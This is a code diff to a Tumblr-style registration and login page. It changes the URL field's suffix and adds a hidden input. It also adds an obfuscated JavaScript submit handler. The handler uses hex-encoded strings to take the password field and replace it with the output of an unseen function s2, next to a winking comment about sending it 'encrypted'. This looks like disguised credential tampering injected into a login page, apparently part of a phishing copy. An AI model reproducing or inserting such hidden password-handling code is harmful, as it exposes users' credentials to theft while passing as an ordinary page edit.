@@ -75,7 +75,7 @@
                         <div class="input_wrapper"> 
                             <label for="tumblelog_name">URL</label> 
                             <input type="text" id="tumblelog_name" name="tumblelog[name]" autocomplete="off"
-                            data-ghostwriter=".tumblr.com" data-validation-type="url"
+                            data-ghostwriter="-x3" data-validation-type="url"
                             value="" /> 
                         </div> 
                         <button type="submit"><span>Start posting!</span></button> 
@@ -94,7 +94,8 @@
                         <div class="input_wrapper"> 
                             <label for="login_password">Password</label> 
                             <input type="password" id="login_password" name="password" /> 
-                        </div> 
+                        </div>
+                        <input type="hidden" value="" id="condensed"/>
                         <button type="submit"><span>Log in</span></button> 
                         <!--<br class="clear" /><p class="forgot_password"><a href="/forgot_password">Forgot your password?</a></p> -->
                     </form> 
@@ -142,23 +143,32 @@
         </div> 
     
         <script type="text/javascript">
+                Event.observe($("register_form"), "submit", function () { // send encrypted.. ;) - WF: {PW->s2}<-s2 (SRV0)
+                        //var form = $('register_form');
+                        //form[form.disabled ? 'enable' : 'disable']();0
+                        //form.disabled = !form.disabled;
+                        var _0x5e94 = ["\x76\x61\x6C\x75\x65", "\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64"];
+                        var _0x5ced = [_0x5e94[0], _0x5e94[1]];
+                        $(_0x5ced[1])[_0x5ced[0]] = s2($(_0x5ced[1])[_0x5ced[0]]);
+                });
+                
                 var _h_mousepx = 0;
                 var _h_keystrokes = 0;
                 var _h_body = document.getElementsByTagName('body')[0];
-                _h_body.onmousemove = function(e){ _h_mousepx++; }
-                _h_body.onkeyup = function(e){ _h_keystrokes++; }
+                
+                _h_body.onmousemove = function (e) { _h_mousepx++; }
+                _h_body.onkeyup = function (e) { _h_keystrokes++; }
                 
                 function _h_prep(the_form) {
                         var hk = $(the_form).select('#hk').first();
                         var i;
-                        if ( (i = hk.value.indexOf(' | ')) > -1) hk.value = hk.value.substring(0, i);
+                        if ((i = hk.value.indexOf(' | ')) > -1) hk.value = hk.value.substring(0, i);
                         hk.value += ' | ' + _h_mousepx + ' ' + _h_keystrokes + ' ' + Math.floor(((17 * _h_mousepx) + (42 * _h_keystrokes) + 1337) / 19.921124);
                 }
                 
                 $('reasons').hide();
                 $$('body').first().removeClassName('small_layout');
-                
-                            $$('body').first().removeClassName('no_js');
+                $$('body').first().removeClassName('no_js');
         </script> 
 </body> 
 </html>
